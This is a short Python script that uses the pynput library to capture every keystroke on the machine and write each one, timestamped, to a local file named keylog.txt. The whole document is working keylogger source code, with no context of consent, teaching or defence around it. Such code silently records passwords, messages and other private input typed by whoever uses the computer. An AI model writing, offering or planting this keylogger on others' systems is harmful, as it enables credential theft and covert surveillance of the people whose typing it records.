from pynput.keyboard import Listener
import logging

# Set up logging to save keystrokes to a file
logging.basicConfig(
    filename="keylog.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Define function to capture each key press
def on_press(key):
    try:
        logging.info(str(key.char))  # Log character keys
    except AttributeError:
        logging.info(str(key))  # Log special keys (e.g., space, enter)

# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
